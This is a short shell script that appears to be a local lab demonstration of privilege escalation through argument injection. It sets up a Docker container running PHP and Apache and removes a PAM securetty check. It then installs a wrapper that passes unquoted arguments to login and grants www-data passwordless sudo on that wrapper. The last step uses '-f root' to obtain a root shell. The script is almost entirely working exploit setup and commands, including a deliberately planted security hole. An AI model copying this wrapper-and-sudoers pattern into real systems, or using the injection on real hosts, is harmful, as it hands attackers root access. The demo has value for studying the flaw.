# rCat (rBash reference, LOL) - Local Privilege Escalation via Argument/Flag Injection

# Spawn a server
docker rm -f local_target 2>/dev/null
docker run -d --name local_target php:8.2-apache
sleep 2

# Get sudo (you need it) and fix PAM
docker exec -u root local_target sh -c 'apt-get update && apt-get install -y sudo'
docker exec -u root local_target sed -i '/pam_securetty.so/d' /etc/pam.d/login

# Set the custom (root) prompt, as the normal ones suck
docker exec -u root local_target sh -c 'echo "export PS1=\"root@apache: # \"" >> /root/.bashrc'

# Close the file, put shell args (don't do that in real stuff)
docker exec -i local_target sh -c 'cat << "EOF" > /usr/local/bin/in.rshd
INPUT_ARGS=$1
exec /usr/bin/login $INPUT_ARGS
EOF'
docker exec -u root local_target chmod +x /usr/local/bin/in.rshd

# Add the sudoers rule, to run in.rshd as (root)
echo "www-data ALL=(root) NOPASSWD: /usr/local/bin/in.rshd" | docker exec -i local_target sh -c 'cat >> /etc/sudoers'

# Spawn a www-data shell
docker exec -it -u root local_target su -s /bin/bash www-data

# Exploit the crappy rshd, with "-f root" to drop a (root) shell
sudo /usr/local/bin/in.rshd "-f root"
